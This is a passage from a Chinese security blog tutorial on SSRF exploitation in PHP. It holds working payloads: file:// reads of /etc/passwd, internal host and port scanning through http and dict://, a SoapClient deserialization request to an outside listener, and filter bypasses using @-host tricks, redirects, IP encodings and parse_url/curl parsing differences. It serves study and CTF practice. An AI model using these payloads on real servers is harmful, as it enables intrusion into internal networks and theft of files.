并把它传递给浏览器</span><br><span class=\"line\">\tcurl\\_close($curlobj); // 关闭 cURL 资源，并且释放系统资源</span><br></pre></td></tr></table></figure>\n\n\n\n<pre><code>// $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;\n// file\\_put\\_contents($filename, $result); \necho $result;\n</code></pre>\n<p>}<br>?&gt;</p>\n<p>构造<code>ssrf.php?url=www.baidu.com</code>即可成功触发ssrf并返回百度主页：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201758.jpeg\"\n                        alt=\"image-20210112231108247\"\n                 ></p>\n<h3 id=\"SoapClient\"><a href=\"#SoapClient\" class=\"headerlink\" title=\"SoapClient\"></a>SoapClient</h3><p>SOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。</p>\n<p>SoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的<code>__call</code>方法，那么<code>__call</code>便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：</p>\n<p>public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</p>\n<ul>\n<li><p>第一个参数是用来指明是否是wsdl模式。</p>\n</li>\n<li><p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。</p>\n</li>\n</ul>\n<p>知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数为一个包含location和uri的数组，location选项的值设置为target_url：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http://47.xxx.xxx.72:2333&#x27;, &#x27;location&#x27;=&gt;&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;));  </span><br><span class=\"line\">$b = serialize($a);  </span><br><span class=\"line\">echo $b;  </span><br><span class=\"line\">$c = unserialize($b);  </span><br><span class=\"line\">$c-&gt;a();    // 随便调用对象中不存在的方法, 触发\\_\\_call方法进行ssrf  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>47.xxx.xxx.72监听2333端口，访问ssrf.php，即可在47.xxx.xxx.72上得到访问的数据：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610597999_5fffc66f758c21c129c42.png!small\"\n                        alt=\"image-20210112234821125\"\n                 ></p>\n<p>如上图所示，ssrf触发成功。</p>\n<p>由于它仅限于http&#x2F;https协议，所以用处不是很大。但是如果这里的http头部还存在crlf漏洞，那么我们就可以进行ssrf+crlf，注入或修改一些http请求头，详情请看：<a class=\"link\"   href=\"https://www.anquanke.com/post/id/202025\" >《SoapClient+crlf组合拳进行SSRF》<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"SSRF漏洞利用的相关协议\"><a href=\"#SSRF漏洞利用的相关协议\" class=\"headerlink\" title=\"SSRF漏洞利用的相关协议\"></a>SSRF漏洞利用的相关协议</h3><p>SSRF漏洞的利用所涉及的协议有：</p>\n<ul>\n<li><p>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</p>\n</li>\n<li><p>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</p>\n</li>\n<li><p>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p>\n</li>\n<li><p>http&#x2F;s协议：探测内网主机存活</p>\n</li>\n</ul>\n<p>下面我们对这些协议的利用进行逐一演示。</p>\n<h2 id=\"常见利用方式（file、http-s和dict协议）\"><a href=\"#常见利用方式（file、http-s和dict协议）\" class=\"headerlink\" title=\"常见利用方式（file、http&#x2F;s和dict协议）\"></a>常见利用方式（file、http&#x2F;s和dict协议）</h2><p>SSRF的利用主要就是读取内网文件、探测内网主机存活、扫描内网端口、攻击内网其他应用等，而这些利用的手法无一不与这些协议息息相关。</p>\n<p>以下几个演示所用的测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">if (isset($\\_GET\\[&#x27;url&#x27;\\]))&#123;</span><br><span class=\"line\">\t$link = $\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">\t$curlobj = curl\\_init(); // 创建新的 cURL 资源</span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); // 设置 URL 和相应的选项</span><br><span class=\"line\">\t$result=curl\\_exec($curlobj); // 抓取 URL 并把它传递给浏览器</span><br><span class=\"line\">\tcurl\\_close($curlobj); // 关闭 cURL 资源，并且释放系统资源</span><br></pre></td></tr></table></figure>\n\n\n\n<pre><code>// $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;\n// file\\_put\\_contents($filename, $result); \necho $result;\n</code></pre>\n<p>}<br>?&gt;</p>\n<h3 id=\"读取内网文件（file协议）\"><a href=\"#读取内网文件（file协议）\" class=\"headerlink\" title=\"读取内网文件（file协议）\"></a>读取内网文件（file协议）</h3><p>我们构造如下payload，即可将服务器上的本地文件及网站源码读取出来：</p>\n<p>ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598000_5fffc670560e2d6fed29c.png!small\"\n                        alt=\"image-20210113000529370\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201861.jpeg\"\n                        alt=\"image-20210113000640979\"\n                 ></p>\n<h3 id=\"探测内网主机存活（http-s协议）\"><a href=\"#探测内网主机存活（http-s协议）\" class=\"headerlink\" title=\"探测内网主机存活（http&#x2F;s协议）\"></a>探测内网主机存活（http&#x2F;s协议）</h3><p>一般是先想办法得到目标主机的网络配置信息，如读取&#x2F;etc&#x2F;hosts、&#x2F;proc&#x2F;net&#x2F;arp、&#x2F;proc&#x2F;net&#x2F;fib_trie等文件，从而获得目标主机的内网网段并进行爆破。</p>\n<p>域网IP地址范围分三类，以下IP段为内网IP段：</p>\n<ul>\n<li><p>C类：192.168.0.0 - 192.168.255.255</p>\n</li>\n<li><p>B类：172.16.0.0 - 172.31.255.255</p>\n</li>\n<li><p>A类：10.0.0.0 - 10.255.255.255</p>\n</li>\n</ul>\n<p>测试环境如下：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201380.jpeg\"\n                        alt=\"image-20210113190506825\"\n                 ></p>\n<p>假设WEB服务器Ubuntu上面存在上述所说的SSRF漏洞，我们构造如下payload，便可通过Ubuntu服务器发送请求去探测内网存活的主机：</p>\n<p>ssrf.php?url&#x3D;<a class=\"link\"   href=\"http://192.168.52.1/\" >http://192.168.52.1<i class=\"fas fa-external-link-alt\"></i></a><br>ssrf.php?url&#x3D;<a class=\"link\"   href=\"http://192.168.52.6/\" >http://192.168.52.6<i class=\"fas fa-external-link-alt\"></i></a><br>ssrf.php?url&#x3D;<a class=\"link\"   href=\"http://192.168.52.25/\" >http://192.168.52.25<i class=\"fas fa-external-link-alt\"></i></a><br>……</p>\n<p>为了方便，我们可以借助burpsuite的Intruder模块进行爆破，如下所示：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598003_5fffc67301c9d222a58c6.png!small\"\n                        alt=\"image-20210113120505690\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201508.jpeg\"\n                        alt=\"image-20210113120551977\"\n                 ></p>\n<p>将爆破的线程尽可能设的小一些。开始爆破后即可探测到目标内网中存在如下两个存活的主机（192.168.52.130和192.168.52.131）：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598005_5fffc6750b23dd040c364.png!small\"\n                        alt=\"image-20210113120806794\"\n                 ></p>\n<h3 id=\"扫描内网端口（http-s和dict协议）\"><a href=\"#扫描内网端口（http-s和dict协议）\" class=\"headerlink\" title=\"扫描内网端口（http&#x2F;s和dict协议）\"></a>扫描内网端口（http&#x2F;s和dict协议）</h3><p>同样是上面那个测试环境：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598006_5fffc67625206702cdd18.png!small\"\n                        alt=\"image-20210113190455756\"\n                 ></p>\n<p>我们利用dict协议构造如下payload即可查看内网主机上开放的端口及端口上运行服务的版本信息等：</p>\n<p>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.52.131:6379&#x2F;info   &#x2F;&#x2F; redis<br>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.52.131:80&#x2F;info     &#x2F;&#x2F; http<br>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.52.130:22&#x2F;info   &#x2F;&#x2F; ssh</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201787.jpeg\"\n                        alt=\"image-20210113190244954\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201476.jpeg\"\n                        alt=\"image-20210113122530377\"\n                 ></p>\n<p>同样可以借助burpsuite来爆破内网主机上的服务。</p>\n<h2 id=\"相关绕过姿势\"><a href=\"#相关绕过姿势\" class=\"headerlink\" title=\"相关绕过姿势\"></a>相关绕过姿势</h2><p>对于SSRF的限制大致有如下几种：</p>\n<ul>\n<li><p>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。</p>\n</li>\n<li><p>限制域名只能为<a class=\"link\"   href=\"http://www.xxx.com/\" >http://www.xxx.com<i class=\"fas fa-external-link-alt\"></i></a></p>\n</li>\n<li><p>限制不能访问内网的IP，以防止对内网进行攻击。</p>\n</li>\n<li><p>屏蔽返回的详细信息。</p>\n</li>\n</ul>\n<h3 id=\"利用HTTP基本身份认证的方式绕过\"><a href=\"#利用HTTP基本身份认证的方式绕过\" class=\"headerlink\" title=\"利用HTTP基本身份认证的方式绕过\"></a>利用HTTP基本身份认证的方式绕过</h3><p>如果目标代码限制访问的域名只能为 <a class=\"link\"   href=\"http://www.xxx.com/\" >http://www.xxx.com<i class=\"fas fa-external-link-alt\"></i></a>，那么我们可以采用HTTP基本身份认证的方式绕过。即@：<a class=\"link\"   href=\"http://www.evil.com/\" >http:&#x2F;&#x2F;www.xxx.com@www.evil.com<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"利用302跳转绕过内网IP\"><a href=\"#利用302跳转绕过内网IP\" class=\"headerlink\" title=\"利用302跳转绕过内网IP\"></a>利用302跳转绕过内网IP</h3><p>绕过对内网ip的限制我们可以<strong>利用302跳转</strong>的方法，有以下两种。</p>\n<p>（1）网络上存在一个很神奇的服务，网址为 <a class=\"link\"   href=\"http://xip.io/\" >http://xip.io<i class=\"fas fa-external-link-alt\"></i></a>，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：</p>\n<p>当我们访问：<a class=\"link\"   href=\"http://127.0.0.1.xip.io/flag.php\" >http://127.0.0.1.xip.io/flag.php<i class=\"fas fa-external-link-alt\"></i></a>时，实际访问的是<a class=\"link\"   href=\"http://127.0.0.1/1.php\" >http://127.0.0.1/1.php<i class=\"fas fa-external-link-alt\"></i></a>。像这种网址还有<a class=\"link\"   href=\"http://nip.io/\" >http://nip.io<i class=\"fas fa-external-link-alt\"></i></a>，<a class=\"link\"   href=\"http://sslip.io/\" >http://sslip.io<i class=\"fas fa-external-link-alt\"></i></a>。</p>\n<p>如下示例（flag.php仅能从本地访问）：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598008_5fffc67858617e4b20974.png!small\"\n                        alt=\"image-20210113124813254\"\n                 ></p>\n<p>（2）短地址跳转绕过，这里也给出一个网址 <a class=\"link\"   href=\"https://4m.cn/\" >https://4m.cn/<i class=\"fas fa-external-link-alt\"></i></a>：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201164.jpeg\"\n                        alt=\"image-20201027163528110\"\n                 ></p>\n<p>直接使用生成的短连接 <a class=\"link\"   href=\"https://4m.cn/FjOdQ\" >https://4m.cn/FjOdQ<i class=\"fas fa-external-link-alt\"></i></a>就会自动302跳转到 <a class=\"link\"   href=\"http://127.0.0.1/flag.php\" >http://127.0.0.1/flag.php<i class=\"fas fa-external-link-alt\"></i></a>上，这样就可以绕过WAF了：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598010_5fffc67a644209d507f01.png!small\"\n                        alt=\"image-20210113124727560\"\n                 ></p>\n<h3 id=\"进制的转换绕过内网IP\"><a href=\"#进制的转换绕过内网IP\" class=\"headerlink\" title=\"进制的转换绕过内网IP\"></a>进制的转换绕过内网IP</h3><p>可以使用一些不同的进制替代ip地址，从而绕过WAF，这里给出个从网上扒的php脚本可以一键转换：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$ip = &#x27;127.0.0.1&#x27;;  </span><br><span class=\"line\">$ip = explode(&#x27;.&#x27;,$ip);  </span><br><span class=\"line\">$r = ($ip\\[0\\] &lt;&lt; 24) | ($ip\\[1\\] &lt;&lt; 16) | ($ip\\[2\\] &lt;&lt; 8) | $ip\\[3\\] ;  </span><br><span class=\"line\">if($r &lt; 0) &#123;  </span><br><span class=\"line\">$r += 4294967296;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">echo &quot;十进制:&quot;;     // 2130706433  </span><br><span class=\"line\">echo $r;  </span><br><span class=\"line\">echo &quot;八进制:&quot;;     // 0177.0.0.1  </span><br><span class=\"line\">echo decoct($r);  </span><br><span class=\"line\">echo &quot;十六进制:&quot;;   // 0x7f.0.0.1  </span><br><span class=\"line\">echo dechex($r);  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"其他各种指向127-0-0-1的地址\"><a href=\"#其他各种指向127-0-0-1的地址\" class=\"headerlink\" title=\"其他各种指向127.0.0.1的地址\"></a>其他各种指向127.0.0.1的地址</h3><p><a class=\"link\"   href=\"http://localhost/\" >http://localhost/<i class=\"fas fa-external-link-alt\"></i></a>         # localhost就是代指127.0.0.1<br><a class=\"link\"   href=\"http://0.0.0.0/\" >http://0/<i class=\"fas fa-external-link-alt\"></i></a>                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1<br>http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]&#x2F;    # 在liunx下可用，window测试了下不行<br>http:&#x2F;&#x2F;[::]:80&#x2F;           # 在liunx下可用，window测试了下不行<br><a class=\"link\"   href=\"http://127.0.0.1/\" >http://127。0。0。1/<i class=\"fas fa-external-link-alt\"></i></a>       # 用中文句号绕过<br>http:&#x2F;&#x2F;①②⑦.⓪.⓪.①<br><a class=\"link\"   href=\"http://127.0.0.1/\" >http://127.1/<i class=\"fas fa-external-link-alt\"></i></a><br><a class=\"link\"   href=\"http://127.0.0.1/\" >http://127.00000.00000.001/<i class=\"fas fa-external-link-alt\"></i></a> # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</p>\n<h3 id=\"利用不存在的协议头绕过指定的协议头\"><a href=\"#利用不存在的协议头绕过指定的协议头\" class=\"headerlink\" title=\"利用不存在的协议头绕过指定的协议头\"></a>利用不存在的协议头绕过指定的协议头</h3><p><code>file_get_contents()</code>函数的一个特性，即当PHP的<code>file_get_contents()</code>函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）</p>\n<p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">highlight\\_file(\\_\\_FILE\\_\\_);  </span><br><span class=\"line\">if(!preg\\_match(&#x27;/^https/is&#x27;,$\\_GET\\[&#x27;url&#x27;\\]))&#123;  </span><br><span class=\"line\">die(&quot;no hack&quot;);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">echo file\\_get\\_contents($\\_GET\\[&#x27;url&#x27;\\]);  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：</p>\n<p>httpsssss:&#x2F;&#x2F;</p>\n<p>此时<code>file_get_contents()</code>函数遇到了不认识的伪协议头“httpsssss:&#x2F;&#x2F;”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：</p>\n<p>ssrf.php?url&#x3D;httpsssss:&#x2F;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598011_5fffc67b28e67ca0b6d7f.png!small\"\n                        alt=\"image-20210113130534208\"\n                 ></p>\n<p>这个方法可以在SSRF的众多协议被禁止且只能使用它规定的某些协议的情况下来进行读取文件。</p>\n<h3 id=\"利用URL的解析问题\"><a href=\"#利用URL的解析问题\" class=\"headerlink\" title=\"利用URL的解析问题\"></a>利用URL的解析问题</h3><p>该思路来自Orange Tsai成员在2017 BlackHat 美国黑客大会上做的题为<a class=\"link\"   href=\"https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf\" >《A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages》<i class=\"fas fa-external-link-alt\"></i></a>的分享。主要是利用readfile和parse_url函数的解析差异以及curl和parse_url解析差异来进行绕过。</p>\n<p><strong>（1）利用readfile和parse_url函数的解析差异绕过指定的端口</strong></p>\n<p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$url = &#x27;http://&#x27;. $\\_GET\\[url\\];</span><br><span class=\"line\">$parsed = parse\\_url($url);</span><br><span class=\"line\">if( $parsed\\[port\\] == 80 )&#123;  // 这里限制了我们传过去的url只能是80端口的</span><br><span class=\"line\">\treadfile($url);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">\tdie(&#x27;Hacker!&#x27;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>用python在当前目录下起一个端口为11211的WEB服务：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201658.jpeg\"\n                        alt=\"image-20210113133210683\"\n                 ></p>\n<p>上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过：</p>\n<p>ssrf.php?url&#x3D;127.0.0.1:11211:80&#x2F;flag.txt</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202332.jpeg\"\n                        alt=\"image-20210113133242461\"\n                 ></p>\n<p>如上图所示成功读取了11211端口中的flag.txt文件，下面用BlackHat的图来说明原理：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610601312_5fffd36035478c41c2c18.png!small?1610601312696\"\n                        alt=\"1610601312_5fffd36035478c41c2c18.png!small?1610601312696\"\n                 ></p>\n<p>从上图中可以看出readfile()函数获取的端口是最后冒号前面的一部分（11211），而parse_url()函数获取的则是最后冒号后面的的端口（80），利用这种差异的不同，从而绕过WAF。</p>\n<p>这两个函数在解析host的时候也有差异，如下图：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610601347_5fffd383dfc1a3982425f.png!small?1610601348433\"\n                        alt=\"1610601347_5fffd383dfc1a3982425f.png!small?1610601348433\"\n                 ></p>\n<p>readfile()函数获取的是@号后面一部分（evil.com），而parse_url()函数获取的则是@号前面的一部分（google.com），利用这种差异的不同，我们可以绕过题目中parse_url()函数对指定host的限制。</p>\n<p><strong>（2）利用curl和parse_url的解析差异绕指定的host</strong></p>\n<p>原理如下：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202234.jpeg\"\n                        alt=\"1610601386_5fffd3aa565a51587d90c.png!small?1610601386867\"\n                 ></p>\n<p>从上图中可以看到curl()函数解析的是第一个@后面的网址，而parse_url()函数解析的是第二个@后面的网址。利用这个原理我们可以绕过题目中parse_url()函数对指定host的限制。</p>\n<p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">highlight\\_file(\\_\\_FILE\\_\\_);</span><br><span class=\"line\">function check\\_inner\\_ip($url)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $match\\_result=preg\\_match(&#x27;/^(http|https)?:\\\\/\\\\/.\\*(\\\\/)?.\\*$/&#x27;,$url);</span><br><span class=\"line\">    if (!$match\\_result)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(&#x27;url fomat error&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    try</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $url\\_parse=parse\\_url($url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    catch(Exception $e)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(&#x27;url fomat error&#x27;);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $hostname=$url\\_parse\\[&#x27;host&#x27;\\];</span><br><span class=\"line\">    $ip=gethostbyname($hostname);</span><br><span class=\"line\">    $int\\_ip=ip2long($ip);</span><br><span class=\"line\">    return ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int\\_ip&gt;&gt;24 || ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int\\_ip&gt;&gt;24 || ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int\\_ip&gt;&gt;20 || ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int\\_ip&gt;&gt;16;// 检查是否是内网ip</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function safe\\_request\\_url($url)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (check\\_inner\\_ip($url))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo $url.&#x27; is inner ip&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $ch = curl\\_init();</span><br><span class=\"line\">        curl\\_setopt($ch, CURLOPT\\_URL, $url);</span><br><span class=\"line\">        curl\\_setopt($ch, CURLOPT\\_RETURNTRANSFER, 1);</span><br><span class=\"line\">        curl\\_setopt($ch, CURLOPT\\_HEADER, 0);</span><br><span class=\"line\">        $output = curl\\_exec($ch);</span><br><span class=\"line\">        $result\\_info = curl\\_getinfo($ch);</span><br><span class=\"line\">        if ($result\\_info\\[&#x27;redirect\\_url&#x27;\\])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            safe\\_request\\_url($result\\_info\\[&#x27;redirect\\_url&#x27;\\]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl\\_close($ch);</span><br><span class=\"line\">        var\\_dump($output);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$url = $\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">if(!empty($url))&#123;</span><br><span class=\"line\">    safe\\_request\\_url($url);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>上述代码中可以看到<code>check_inner_ip</code>函数通过<code>url_parse()</code>函数检测是否为内网IP，如果不是内网 IP ，则通过<code>curl()</code>请求 url 并返回结果，我们可以利用curl和parse_url解析的差异不同来绕过这里的限制，让<code>parse_url()</code>处理外部网站网址，最后<code>curl()</code>请求内网网址。paylaod如下：</p>\n<p>ssrf.php?url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:<a class=\"link\"   href=\"mailto:&#x38;&#x30;&#x40;&#x77;&#x77;&#x77;&#x2e;&#98;&#x61;&#x69;&#100;&#117;&#x2e;&#x63;&#111;&#x6d;\" >&#x38;&#x30;&#x40;&#x77;&#x77;&#x77;&#x2e;&#98;&#x61;&#x69;&#100;&#117;&#x2e;&#x63;&#111;&#x6d;<i class=\"fas fa-external-link-alt\"></i></a>&#x2F;flag.php</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202304.jpeg\"\n                        alt=\"image-20210113134443846\"\n                 ></p>\n<p>的 <a class=\"link\"   href=\"https://whoamianony.top/2020/11/24/ctf-bi-sai-ji-lu/2020-shou-jie-xiang-yun-bei-wang-luo-an-quan-da-sai-writeup/#toc-heading-5\" >[2020 首届“祥云杯”网络安全大赛]doyouknowssrf<i class=\"fas fa-external-link-alt\"></i></a>这道题利用的就是这个思路。</p>\n<h2 id=\"常见攻击方式（Gopher协议）\"><a href=\"#常见攻击方式（Gopher协议）\" class=\"headerlink\" 